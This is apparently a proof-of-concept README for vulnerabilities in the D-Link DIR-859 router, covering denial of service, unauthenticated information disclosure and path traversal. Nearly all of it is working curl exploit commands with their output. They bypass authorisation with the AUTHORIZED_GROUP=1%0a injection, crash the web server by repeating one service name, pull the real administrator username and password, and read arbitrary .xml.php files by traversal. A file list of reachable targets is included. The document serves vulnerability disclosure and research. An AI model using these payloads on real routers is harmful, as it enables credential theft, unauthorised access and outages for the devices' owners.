#  POC: D-Link DIR-859 Vulnerabilities; Denial of Service, Unauthenticated Information Disclosure and Path Traversal 
This repository contains proof of concepts for a Denial of Service vulnerability, a Path Traversal vulnerability and an Information Disclosure vulnerability in D-Link DIR-859. 

These vulnerabilities are in regard to the device D-Link DIR-859 with firmware version 1.04, but is suspected to be vulnerable for all firmware versions below v1.07b03_beta, and possibly other routers with firmwares using the AUTHORIZED_GROUP global variable in a similar manner. 

## Denial of Service Vulnerability
There is a known vulnerability labeled as CVE-2019–20213. This vulnerability suggests access to arbitrary files via AUTHORIZED_GROUP=1. However, it is not only possible to get files, an attacker may also use this exploit to perform a Denial of Service attack on the victim machine. If we look at the file ./htdocs/web/getcfg.php we see the following:

### htdocs/web/getcfg.php
<details>
	<summary>Details (click to expand)</summary>

```php
cat ./htdocs/web/getcfg.php                       
HTTP/1.1 200 OK
Content-Type: text/xml

<?echo "<?";?>xml version="1.0" encoding="utf-8"<?echo "?>";?>
<postxml>
<? include "/htdocs/phplib/trace.php";

if ($_POST["CACHE"] == "true")
{
	echo dump(1, "/runtime/session/".$SESSION_UID."/postxml");
}
else
{
	if($AUTHORIZED_GROUP < 0)
	{
		/* not a power user, return error message */
		echo "\t<result>FAILED</result>\n";
		echo "\t<message>Not authorized</message>\n";
	}
	else
	{
		/* cut_count() will return 0 when no or only one token. */
		$SERVICE_COUNT = cut_count($_POST["SERVICES"], ",");
		TRACE_debug("GETCFG: got ".$SERVICE_COUNT." service(s): ".$_POST["SERVICES"]);
		$SERVICE_INDEX = 0;
		while ($SERVICE_INDEX < $SERVICE_COUNT)
		{
			$GETCFG_SVC = cut($_POST["SERVICES"], $SERVICE_INDEX, ",");
			TRACE_debug("GETCFG: serivce[".$SERVICE_INDEX."] = ".$GETCFG_SVC);
			if ($GETCFG_SVC!="")
			{
				$file = "/htdocs/webinc/getcfg/".$GETCFG_SVC.".xml.php";
				/* GETCFG_SVC will be passed to the child process. */
				if (isfile($file)=="1") dophp("load", $file);
			}
			$SERVICE_INDEX++;
		}
	}
}
?></postxml>
```

</details>

We can see that a loop is entered after the service count is set by the passed services using a delimiter ',' suggesting it is allowed to request more than one service via getcfg.php. If an attacker was to requests configurations containing large amount of data, for example RUNTIME.WPS.WLAN-1, it will result in the victim being overwhelmed. To illustrate this, we call getcfg.php with the service DEVICE.ACCOUNT first, and count the lines received:

### DEVICE.ACCOUNT
```
$ curl "http://192.168.0.1/getcfg.php" -d "SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a" | wc -l 
26
```

Next, we change the service to RUNTIME.WPS.WLAN-1. Note that the file getcfg.php remains the same.

### RUNTIME.WPS.WLAN-1
```
$ curl "http://192.168.0.1/getcfg.php" -d "SERVICES=RUNTIME.WPS.WLAN-1&AUTHORIZED_GROUP=1%0a" | wc -l
4898
```

Now, if we pass multiple RUNTIME.WPS.WLAN-1 for the arguments, the victim will be overwhelmed:

### Requesting Multiple Services
<details>
	<summary>Details  (click to expand)</summary> 


```shell
curl "http://192.168.0.1/getcfg.php" -d "SERVICES=RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,RUNTIME.WPS.WLAN-1,&AUTHORIZED_GROUP=1%0a" | wc -l
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3470    0     0  100  3470      0     66  0:00:52  0:00:52 --:--:--     0
curl: (52) Empty reply from server
```


</details>

If we attempt to simultaneously get the login page, the request times out.
### Attempting to get login page
```
curl http://192.168.0.1/info/Login.html
curl: (52) Empty reply from server
```

## Information Disclosure Vulnerability

The aformentioned vulnerability is also displaying that the attacker may request any configuration for any service that is listed in /htdocs/webinc/getcfg/, and not only retrieve the files such as vpnconfig.php or getcfg.php as is suggested by the CVE-2019–20213, but retrieve any configuration file as well depending on the service selected by using getcfg.php. See below:
### DEVICE.ACCOUNT service configuration via getcfg.php
<details>
	<summary>Details (click to expand)</summary>

```
curl "http://192.168.0.1/getcfg.php" -d "SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a"        
<?xml version="1.0" encoding="utf-8"?>
<postxml>
<module>
	<service>DEVICE.ACCOUNT</service>
	<device>
		<account>
			<seqno></seqno>
			<max>2</max>
			<count>1</count>
			<entry>
				<name>Admin</name>
				<password>==OoXxGgYy==</password>
				<group>0</group>
				<description></description>
			</entry>
		</account>
		<session>
			<captcha>0</captcha>
			<dummy></dummy>
			<timeout>300</timeout>
			<maxsession>128</maxsession>
			<maxauthorized>16</maxauthorized>
		</session>
	</device>
</module>
</postxml>

```

</details>


Here, it displays the service config to DEVICE.ACCOUNT and some account information, however the username and password is not the real administrator credentials.

Although, if an attacker changes the service they are requesting to (again) `RUNTIME.WPS.WLAN-1` they will get access to the real administrator credentials. Note that the file getcfg.php remains the same as before. (Most of the output is omitted due to its size.)
### Service RUNTIME.WPS.WLAN-1

```
curl "http://192.168.0.1/getcfg.php" -d "SERVICES=RUNTIME.WPS.WLAN-1&AUTHORIZED_GROUP=1%0a" | rg --word-regexp "username|password" 

<password>password123</password>
<username>admin</username>
```

## Path Traversal Vulnerability

Above we have detailed a way to perform a Denial of Service attack and how to retrieve configuration files that are in the folder /htdocs/webinc/getcfg. Additionally, using the same attack vector it is also possible to perform a path traversal and effectively retrieve ***any*** file ending with '.xml.php'. See below. 

<details>
	<summary>Path Traversal (Click to expand)</summary>

```
$ curl -X POST "http://192.168.0.1/getcfg.php" -d "SERVICES=../../upnpdevdesc/WANIPConnection&AUTHORIZED_GROUP=1%0a" 
<?xml version="1.0" encoding="utf-8"?>
<postxml>
<?xml version="1.0"?>
<scpd xmlns="urn:schemas-upnp-org:service-1-0">
	<specVersion>
		<major>1</major>
		<minor>0</minor>
	</specVersion>
	<actionList>
		<action>
			<name>SetConnectionType</name>
			<argumentList>
				<argument>
					<name>NewConnectionType</name>
					<direction>in</direction>
					<relatedStateVariable>ConnectionType</relatedStateVariable>
				</argument>
			</argumentList>
		</action> 
		<action>
			<name>GetConnectionTypeInfo</name>
			<argumentList>
				<argument>
					<name>NewConnectionType</name>
					<direction>out</direction>
					<relatedStateVariable>ConnectionType</relatedStateVariable>
				</argument>
				<argument>
					<name>NewPossibleConnectionTypes</name>
					<direction>out</direction>
					<relatedStateVariable>PossibleConnectionTypes</relatedStateVariable>
				</argument>
			</argumentList>
		</action>
		<action>
			<name>RequestConnection</name>
		</action>
		<action>
			<name>ForceTermination</name>
		</action>
		<action>
			<name>GetStatusInfo</name>
			<argumentList>
				<argument>
					<name>NewConnectionStatus</name>
					<direction>out</direction>
					<relatedStateVariable>ConnectionStatus</relatedStateVariable>
				</argument>
				<argument>
					<name>NewLastConnectionError</name>
					<direction>out</direction>
					<relatedStateVariable>LastConnectionError</relatedStateVariable>
				</argument>
				<argument>
					<name>NewUptime</name>
					<direction>out</direction>
					<relatedStateVariable>Uptime</relatedStateVariable>
				</argument>
			</argumentList>
		</action>
		<action>
			<name>GetNATRSIPStatus</name>
			<argumentList>
				<argument>
					<name>NewRSIPAvailable</name>
					<direction>out</direction>
					<relatedStateVariable>RSIPAvailable</relatedStateVariable>
				</argument>
				<argument>
					<name>NewNATEnabled</name>
					<direction>out</direction>
					<relatedStateVariable>NATEnabled</relatedStateVariable>
				</argument>
			</argumentList>
		</action>
		<action>
			<name>GetGenericPortMappingEntry</name>
			<argumentList>
				<argument>
					<name>NewPortMappingIndex</name>
					<direction>in</direction>
					<relatedStateVariable>PortMappingNumberOfEntries</relatedStateVariable>
				</argument>
				<argument>
					<name>NewRemoteHost</name>
					<direction>out</direction>
					<relatedStateVariable>RemoteHost</relatedStateVariable>
				</argument>
				<argument>
					<name>NewExternalPort</name>
					<direction>out</direction>
					<relatedStateVariable>ExternalPort</relatedStateVariable>
				</argument>
				<argument>
					<name>NewProtocol</name>
					<direction>out</direction>
					<relatedStateVariable>PortMappingProtocol</relatedStateVariable>
				</argument>
				<argument>
					<name>NewInternalPort</name>
					<direction>out</direction>
					<relatedStateVariable>InternalPort</relatedStateVariable>
				</argument>
				<argument>
					<name>NewInternalClient</name>
					<direction>out</direction>
					<relatedStateVariable>InternalClient</relatedStateVariable>
				</argument>
				<argument>
					<name>NewEnabled</name>
					<direction>out</direction>
					<relatedStateVariable>PortMappingEnabled</relatedStateVariable>
				</argument>
				<argument>
					<name>NewPortMappingDescription</name>
					<direction>out</direction>
					<relatedStateVariable>PortMappingDescription</relatedStateVariable>
				</argument>
				<argument>
					<name>NewLeaseDuration</name>
					<direction>out</direction>
					<relatedStateVariable>PortMappingLeaseDuration</relatedStateVariable>
				</argument>
			</argumentList>
		</action>
		<action>
			<name>GetSpecificPortMappingEntry</name>
			<argumentList>
				<argument>
					<name>NewRemoteHost</name>
					<direction>in</direction>
					<relatedStateVariable>RemoteHost</relatedStateVariable>
				</argument>
				<argument>
					<name>NewExternalPort</name>
					<direction>in</direction>
					<relatedStateVariable>ExternalPort</relatedStateVariable>
				</argument>
				<argument>
					<name>NewProtocol</name>
					<direction>in</direction>
					<relatedStateVariable>PortMappingProtocol</relatedStateVariable>
				</argument>
				<argument>
					<name>NewInternalPort</name>
					<direction>out</direction>
					<relatedStateVariable>InternalPort</relatedStateVariable>
				</argument>
				<argument>
					<name>NewInternalClient</name>
					<direction>out</direction>
					<relatedStateVariable>InternalClient</relatedStateVariable>
				</argument>
				<argument>
					<name>NewEnabled</name>
					<direction>out</direction>
					<relatedStateVariable>PortMappingEnabled</relatedStateVariable>
				</argument>
				<argument>
					<name>NewPortMappingDescription</name>
					<direction>out</direction>
					<relatedStateVariable>PortMappingDescription</relatedStateVariable>
				</argument>
				<argument>
					<name>NewLeaseDuration</name>
					<direction>out</direction>
					<relatedStateVariable>PortMappingLeaseDuration</relatedStateVariable>
				</argument>
			</argumentList>
		</action>
		<action>
			<name>AddPortMapping</name>
			<argumentList>
				<argument>
					<name>NewRemoteHost</name>
					<direction>in</direction>
					<relatedStateVariable>RemoteHost</relatedStateVariable>
				</argument>
				<argument>
					<name>NewExternalPort</name>
					<direction>in</direction>
					<relatedStateVariable>ExternalPort</relatedStateVariable>
				</argument>
				<argument>
					<name>NewProtocol</name>
					<direction>in</direction>
					<relatedStateVariable>PortMappingProtocol</relatedStateVariable>
				</argument>
				<argument>
					<name>NewInternalPort</name>
					<direction>in</direction>
					<relatedStateVariable>InternalPort</relatedStateVariable>
				</argument>
				<argument>
					<name>NewInternalClient</name>
					<direction>in</direction>
					<relatedStateVariable>InternalClient</relatedStateVariable>
				</argument>
				<argument>
					<name>NewEnabled</name>
					<direction>in</direction>
					<relatedStateVariable>PortMappingEnabled</relatedStateVariable>
				</argument>
				<argument>
					<name>NewPortMappingDescription</name>
					<direction>in</direction>
					<relatedStateVariable>PortMappingDescription</relatedStateVariable>
				</argument>
				<argument>
					<name>NewLeaseDuration</name>
					<direction>in</direction>
					<relatedStateVariable>PortMappingLeaseDuration</relatedStateVariable>
				</argument>
			</argumentList>
		</action>
		<action>
			<name>DeletePortMapping</name>
			<argumentList>
				<argument>
					<name>NewRemoteHost</name>
					<direction>in</direction>
					<relatedStateVariable>RemoteHost</relatedStateVariable>
				</argument>
				<argument>
					<name>NewExternalPort</name>
					<direction>in</direction>
					<relatedStateVariable>ExternalPort</relatedStateVariable>
				</argument>
				<argument>
					<name>NewProtocol</name>
					<direction>in</direction>
					<relatedStateVariable>PortMappingProtocol</relatedStateVariable>
				</argument>
			</argumentList>
		</action>
		<action>
			<name>GetExternalIPAddress</name>
			<argumentList>
				<argument>
					<name>NewExternalIPAddress</name>
					<direction>out</direction>
					<relatedStateVariable>ExternalIPAddress</relatedStateVariable>
				</argument>
			</argumentList>
		</action>
	</actionList>
	<serviceStateTable>
		<stateVariable sendEvents="no">
			<name>ConnectionType</name>
			<dataType>string</dataType>
			<defaultValue>Unconfigured</defaultValue>
		</stateVariable>
		<stateVariable sendEvents="yes">
			<name>PossibleConnectionTypes</name>
			<dataType>string</dataType>
			<allowedValueList>
				<allowedValue>Unconfigured</allowedValue>
				<allowedValue>IP_Routed</allowedValue>
				<allowedValue>IP_Bridged</allowedValue>
			</allowedValueList>
		</stateVariable>
		<stateVariable sendEvents="yes">
			<name>ConnectionStatus</name>
			<dataType>string</dataType>
			<defaultValue>Unconfigured</defaultValue>
			<allowedValueList>
				<allowedValue>Unconfigured</allowedValue>
				<allowedValue>Connecting</allowedValue>
				<allowedValue>Authenticating</allowedValue>
				<allowedValue>PendingDisconnect</allowedValue>
				<allowedValue>Disconnecting</allowedValue>
				<allowedValue>Disconnected</allowedValue>
				<allowedValue>Connected</allowedValue>
			</allowedValueList>
		</stateVariable>
		<stateVariable sendEvents="no">
			<name>Uptime</name>
			<dataType>ui4</dataType>
			<defaultValue>0</defaultValue>
			<allowedValueRange>
				<minimum>0</minimum>
				<maximum></maximum>
				<step>1</step>
			</allowedValueRange>
		</stateVariable>
		<stateVariable sendEvents="no">
			<name>RSIPAvailable</name>
		<dataType>boolean</dataType>
			<defaultValue>0</defaultValue>
		</stateVariable>
		<stateVariable sendEvents="no">
			<name>NATEnabled</name>
			<dataType>boolean</dataType>
			<defaultValue>1</defaultValue>
		</stateVariable>  
		<stateVariable sendEvents="yes">
			<name>X_Name</name>
			<dataType>string</dataType>
		</stateVariable>
		<stateVariable sendEvents="no">
			<name>LastConnectionError</name>
			<dataType>string</dataType>
			<defaultValue>ERROR_NONE</defaultValue>
			<allowedValueList>
				<allowedValue>ERROR_NONE</allowedValue>
				<allowedValue>ERROR_ISP_TIME_OUT</allowedValue>
				<allowedValue>ERROR_COMMAND_ABORTED</allowedValue>
				<allowedValue>ERROR_NOT_ENABLED_FOR_INTERNET</allowedValue>
				<allowedValue>ERROR_BAD_PHONE_NUMBER</allowedValue>
				<allowedValue>ERROR_USER_DISCONNECT</allowedValue>
				<allowedValue>ERROR_ISP_DISCONNECT</allowedValue>
				<allowedValue>ERROR_IDLE_DISCONNECT</allowedValue>
				<allowedValue>ERROR_FORCED_DISCONNECT</allowedValue>
				<allowedValue>ERROR_SERVER_OUT_OF_RESOURCES</allowedValue>
				<allowedValue>ERROR_RESTRICTED_LOGON_HOURS</allowedValue>
				<allowedValue>ERROR_ACCOUNT_DISABLED</allowedValue>
				<allowedValue>ERROR_ACCOUNT_EXPIRED</allowedValue>
				<allowedValue>ERROR_PASSWORD_EXPIRED</allowedValue>
				<allowedValue>ERROR_AUTHENTICATION_FAILURE</allowedValue>
				<allowedValue>ERROR_NO_DIALTONE</allowedValue>
				<allowedValue>ERROR_NO_CARRIER</allowedValue>
				<allowedValue>ERROR_NO_ANSWER</allowedValue>
				<allowedValue>ERROR_LINE_BUSY</allowedValue>
				<allowedValue>ERROR_UNSUPPORTED_BITSPERSECOND</allowedValue>
				<allowedValue>ERROR_TOO_MANY_LINE_ERRORS</allowedValue>
				<allowedValue>ERROR_IP_CONFIGURATION</allowedValue>
				<allowedValue>ERROR_UNKNOWN</allowedValue>
			</allowedValueList>
		</stateVariable>
		<stateVariable sendEvents="yes">
			<name>ExternalIPAddress</name>
			<dataType>string</dataType>
		</stateVariable>
		<stateVariable sendEvents="no">
			<name>RemoteHost</name>
			<dataType>string</dataType>
		</stateVariable>
		<stateVariable sendEvents="no">
			<name>ExternalPort</name>
			<dataType>ui2</dataType>
		</stateVariable>
		<stateVariable sendEvents="no">
			<name>InternalPort</name>
			<dataType>ui2</dataType>
		</stateVariable>
		<stateVariable sendEvents="no">
			<name>PortMappingProtocol</name>
			<dataType>string</dataType>
			<allowedValueList>
				<allowedValue>TCP</allowedValue>
				<allowedValue>UDP</allowedValue>
			</allowedValueList>
		</stateVariable>
		<stateVariable sendEvents="no">
			<name>InternalClient</name>
			<dataType>string</dataType>
		</stateVariable>
		<stateVariable sendEvents="no">
			<name>PortMappingDescription</name>
			<dataType>string</dataType>
		</stateVariable>
		<stateVariable sendEvents="no">
			<name>PortMappingEnabled</name>
			<dataType>boolean</dataType>
		</stateVariable>
		<stateVariable sendEvents="no">
			<name>PortMappingLeaseDuration</name>
			<dataType>ui4</dataType>
		</stateVariable>
		<stateVariable sendEvents="yes">
			<name>PortMappingNumberOfEntries</name>
			<dataType>ui2</dataType>
		</stateVariable>
	</serviceStateTable>
</scpd>
</postxml>
```

</details>


<details>
	<summary>Files ending with .xml.php (Click to expand)</summary>

```    
./htdocs/upnpdevdesc/WANIPConnection.xml.php
./htdocs/upnpdevdesc/Layer3Forwarding.xml.php
./htdocs/upnpdevdesc/WFAWLANConfig.xml.php
./htdocs/upnpdevdesc/WANEthernetLinkConfig.xml.php
./htdocs/upnpdevdesc/OSInfo.xml.php
./htdocs/upnpdevdesc/WFADevice.xml.php
./htdocs/upnpdevdesc/InternetGatewayDevice.xml.php
./htdocs/upnpdevdesc/WANCommonInterfaceConfig.xml.php
./htdocs/webinc/getcfg/INET.LAN-2.xml.php
./htdocs/webinc/getcfg/RUNTIME.DEVICE.xml.php
./htdocs/webinc/getcfg/PFWD.NAT-2.xml.php
./htdocs/webinc/getcfg/INET.WAN-3.xml.php
./htdocs/webinc/getcfg/WIFI.PHYINF.xml.php
./htdocs/webinc/getcfg/RUNTIME.PHYINF.ETH-1.xml.php
./htdocs/webinc/getcfg/DMZ.NAT-1.xml.php
./htdocs/webinc/getcfg/RUNTIME.CONNSTA.xml.php
./htdocs/webinc/getcfg/RUNTIME.PHYINF.ETH-3.xml.php
./htdocs/webinc/getcfg/INET.WAN-2.xml.php
./htdocs/webinc/getcfg/PORTT.NAT-1.xml.php
./htdocs/webinc/getcfg/PHYINF.BRIDGE-1.xml.php
./htdocs/webinc/getcfg/CALLMGR.xml.php
./htdocs/webinc/getcfg/VSVR.NAT-2.xml.php
./htdocs/webinc/getcfg/FIREWALL-2.xml.php
./htdocs/webinc/getcfg/ICMP.WAN-2.xml.php
./htdocs/webinc/getcfg/MULTICAST.xml.php
./htdocs/webinc/getcfg/INET.xml.php
./htdocs/webinc/getcfg/SMS.SEND.xml.php
./htdocs/webinc/getcfg/NAT.xml.php
./htdocs/webinc/getcfg/RUNTIME.INF.xml.php
./htdocs/webinc/getcfg/DNS4.INF.xml.php
./htdocs/webinc/getcfg/RUNTIME.UPNP.PORTM.xml.php
./htdocs/webinc/getcfg/DHCPS4.LAN-1.xml.php
./htdocs/webinc/getcfg/BRIDGE.xml.php
./htdocs/webinc/getcfg/HTTP.WAN-2.xml.php
./htdocs/webinc/getcfg/DHCPS4.LAN-2.xml.php
./htdocs/webinc/getcfg/INET.BRIDGE-1.xml.php
./htdocs/webinc/getcfg/DHCPS6.BRIDGE-1.xml.php
./htdocs/webinc/getcfg/RUNTIME.ROUTE.DYNAMIC.xml.php
./htdocs/webinc/getcfg/MACCTRL.xml.php
./htdocs/webinc/getcfg/DHCPS4.INF.xml.php
./htdocs/webinc/getcfg/SMS.xml.php
./htdocs/webinc/getcfg/NETSNIPER.NAT-1.xml.php
./htdocs/webinc/getcfg/DMZ.NAT-2.xml.php
./htdocs/webinc/getcfg/DHCPS6.LAN-1.xml.php
./htdocs/webinc/getcfg/RUNTIME.DDNS4.WAN-1.xml.php
./htdocs/webinc/getcfg/DHCPS6.LAN-3.xml.php
./htdocs/webinc/getcfg/DHCPS6.INF.xml.php
./htdocs/webinc/getcfg/ROUTE6.DYNAMIC.xml.php
./htdocs/webinc/getcfg/ICMP.WAN-1.xml.php
./htdocs/webinc/getcfg/RUNTIME.PHYINF.xml.php
./htdocs/webinc/getcfg/RUNTIME.INF.LAN-2.xml.php
./htdocs/webinc/getcfg/DNS4.LAN-2.xml.php
./htdocs/webinc/getcfg/INET.LAN-3.xml.php
./htdocs/webinc/getcfg/ACL.xml.php
./htdocs/webinc/getcfg/FIREWALL-3.xml.php
./htdocs/webinc/getcfg/DEVICE.DIAGNOSTIC.xml.php
./htdocs/webinc/getcfg/SCHEDULE.xml.php
./htdocs/webinc/getcfg/RUNTIME.INF.BRIDGE-1.xml.php
./htdocs/webinc/getcfg/INET.LAN-1.xml.php
./htdocs/webinc/getcfg/PFWD.NAT-1.xml.php
./htdocs/webinc/getcfg/RUNTIME.INF.LAN-5.xml.php
./htdocs/webinc/getcfg/RUNTIME.PHYINF.WLAN-1.xml.php
./htdocs/webinc/getcfg/DDNS4.WAN-1.xml.php
./htdocs/webinc/getcfg/WAN.xml.php
./htdocs/webinc/getcfg/FDISK.xml.php
./htdocs/webinc/getcfg/INET.LAN-6.xml.php
./htdocs/webinc/getcfg/RUNTIME.TIME.xml.php
./htdocs/webinc/getcfg/ROUTE.STATIC.xml.php
./htdocs/webinc/getcfg/WIFI.WLAN-1.xml.php
./htdocs/webinc/getcfg/HTTP.WAN-1.xml.php
./htdocs/webinc/getcfg/STARSPEED.WAN-1.xml.php
./htdocs/webinc/getcfg/DHCPS4.BRIDGE-1.xml.php
./htdocs/webinc/getcfg/RUNTIME.INF.LAN-1.xml.php
./htdocs/webinc/getcfg/UPNP.BRIDGE-1.xml.php
./htdocs/webinc/getcfg/RUNTIME.PHYINF.WLAN-2.xml.php
./htdocs/webinc/getcfg/DEVICE.LAYOUT.xml.php
./htdocs/webinc/getcfg/DEVICE.HOSTNAME.xml.php
./htdocs/webinc/getcfg/WIFI.WLAN-2.xml.php
./htdocs/webinc/getcfg/DDNS4.INF.xml.php
./htdocs/webinc/getcfg/HTTP.WAN-3.xml.php
./htdocs/webinc/getcfg/INET.INF.xml.php
./htdocs/webinc/getcfg/RUNTIME.INF.WAN-3.xml.php
./htdocs/webinc/getcfg/WIFI.xml.php
./htdocs/webinc/getcfg/PHYINF.WIFI.xml.php
./htdocs/webinc/getcfg/RUNTIME.INF.WAN-1.xml.php
./htdocs/webinc/getcfg/RUNTIME.WPS.WLAN-1.xml.php
./htdocs/webinc/getcfg/RUNTIME.DFS.xml.php
./htdocs/webinc/getcfg/WAN.RESTART.xml.php
./htdocs/webinc/getcfg/RUNTIME.INF.LAN-6.xml.php
./htdocs/webinc/getcfg/RUNTIME.INF.LAN-4.xml.php
./htdocs/webinc/getcfg/URLCTRL.xml.php
./htdocs/webinc/getcfg/DHCPS6.LAN-4.xml.php
./htdocs/webinc/getcfg/INF.xml.php
./htdocs/webinc/getcfg/PHYINF.LAN-1.xml.php
./htdocs/webinc/getcfg/DEVICE.RDNSS.xml.php
./htdocs/webinc/getcfg/INET.WAN-5.xml.php
./htdocs/webinc/getcfg/VSVR.NAT-1.xml.php
./htdocs/webinc/getcfg/CALL.MISSED.xml.php
./htdocs/webinc/getcfg/INET.WAN-4.xml.php
./htdocs/webinc/getcfg/RUNTIME.PHYINF.ETH-2.xml.php
./htdocs/webinc/getcfg/FIREWALL.xml.php
./htdocs/webinc/getcfg/INET.LAN-4.xml.php
./htdocs/webinc/getcfg/INET.LAN-5.xml.php
./htdocs/webinc/getcfg/DEVICE.TIME.xml.php
./htdocs/webinc/getcfg/RUNTIME.LOG.xml.php
./htdocs/webinc/getcfg/RUNTIME.CLIENTS.xml.php
./htdocs/webinc/getcfg/DEVICE.LOG.xml.php
./htdocs/webinc/getcfg/DNS4.LAN-1.xml.php
./htdocs/webinc/getcfg/RUNTIME.TTY.xml.php
./htdocs/webinc/getcfg/DEVICE.PASSTHROUGH.xml.php
./htdocs/webinc/getcfg/RUNTIME.OPERATOR.xml.php
./htdocs/webinc/getcfg/ROUTE.IPUNNUMBERED.xml.php
./htdocs/webinc/getcfg/INET.WAN-1.xml.php
